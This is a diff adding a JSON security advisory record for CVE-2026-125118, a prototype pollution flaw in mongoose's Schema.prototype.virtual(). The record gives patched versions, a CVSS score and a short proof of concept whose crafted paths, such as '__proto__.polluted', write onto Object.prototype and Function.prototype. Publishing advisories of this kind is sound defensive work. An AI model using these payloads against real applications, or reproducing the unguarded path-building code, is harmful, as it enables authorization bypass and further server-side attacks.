@@ -1,0 +1,95 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-11-10T20:46:34Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "mongoose"
+  },
+  "Advisory": {
+    "DatabaseId": 530129,
+    "Id": "GSA_kwCzR0hTQS02OTcyLTltY20tdmh3as4ACBbR",
+    "GhsaId": "GHSA-6972-9mcm-vhwj",
+    "References": [
+      {
+        "Url": "https://github.com/Automattic/mongoose/security/advisories/GHSA-6972-9mcm-vhwj"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-125118"
+      },
+      {
+        "Url": "https://github.com/Automattic/mongoose/commit/318f7e09dd363a1dfddb8180878488dccd2796d1"
+      },
+      {
+        "Url": "https://github.com/Automattic/mongoose/commit/74df7769b5a8d89c4413b764029911ee915ea467"
+      },
+      {
+        "Url": "https://github.com/Automattic/mongoose/commit/7a2a6567abbb72c0430c8cc5b7942141844fecff"
+      },
+      {
+        "Url": "https://github.com/Automattic/mongoose/commit/fb467e6d33174293dc0360649f20ce68d99117a9"
+      },
+      {
+        "Url": "https://github.com/Automattic/mongoose/releases/tag/6.13.12"
+      },
+      {
+        "Url": "https://github.com/Automattic/mongoose/releases/tag/7.8.13"
+      },
+      {
+        "Url": "https://github.com/Automattic/mongoose/releases/tag/8.24.7"
+      },
+      {
+        "Url": "https://github.com/Automattic/mongoose/releases/tag/9.11.4"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-6972-9mcm-vhwj"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-6972-9mcm-vhwj"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-125118"
+      }
+    ],
+    "Description": "### Summary\n\nPrototype pollution via Schema.prototype.virtual() — the 2022 fix for CVE-2022-2564 / CVE-2022-24304 protected Schema.path()/add() but never virtual(), so the same class of bug is still exploitable in all maintained release lines.\n\n### Details\n\nIn lib/schema.js, Schema.prototype.virtual() (defined at line 2643) builds the virtual path via:\n\n```javascript\nvirtuals[name] = parts.reduce(function(mem, part, i) {\nmem[part] || (mem[part] = (i === parts.length - 1)\n? new VirtualType(options, name)\n: {});\nreturn mem[part];\n}, this.tree); // lines 2755-2759\n```\n\nUnlike `path()`/`add()`, `virtual()` never received the `specialProperties` check added for CVE-2022-2564/CVE-2022-24304 (`lib/schema.js` lines 806, 1308, 1331).\n\nA path containing `__proto__`/`constructor`/`prototype` segments resolves through the prototype chain and writes onto `Object.prototype` / `Function.prototype`.\n\n### Proof of concept\n\n```javascript\nconst mongoose = require('mongoose');\nconst schema = new mongoose.Schema({});\n\nschema.virtual('__proto__.polluted');\nconsole.log(({}).polluted); // VirtualType instance\nconsole.log(Object.prototype.hasOwnProperty('polluted')); // true\nconsole.log(Object.getOwnPropertyDescriptor(\nObject.prototype, 'polluted').enumerable); // true\n\nschema.virtual('constructor.prototype.opol');\nconsole.log(({}).opol); // true\n\nschema.virtual('hasOwnProperty.__proto__.fpol');\nconsole.log((function(){}).fpol); // Function.prototype polluted\n```\n\n### Impact\n\nAttacker-influenced schema field names (dynamic schemas, CMS form builders, schema-as-code) allow pollution of Object.prototype (own, enumerable keys visible on every object — e.g. `({}).isAdmin` checks can be spoofed) and Function.prototype (a known gadget primitive in server-side JS).",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-11-10T20:46:33Z",
+    "Severity": "MODERATE",
+    "Summary": "Mongoose: Prototype pollution via Schema.prototype.virtual()",
+    "UpdatedAt": "2026-11-10T20:46:34Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 6.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "9.11.4"
+      },
+      "VulnerableVersionRange": "\u003e= 9.0.0, \u003c 9.11.4"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "8.24.7"
+      },
+      "VulnerableVersionRange": "\u003e= 8.0.0, \u003c 8.24.7"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "7.8.13"
+      },
+      "VulnerableVersionRange": "\u003e= 7.0.0, \u003c 7.8.13"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "6.13.12"
+      },
+      "VulnerableVersionRange": "\u003c 6.13.12"
+    }
+  ]
+}
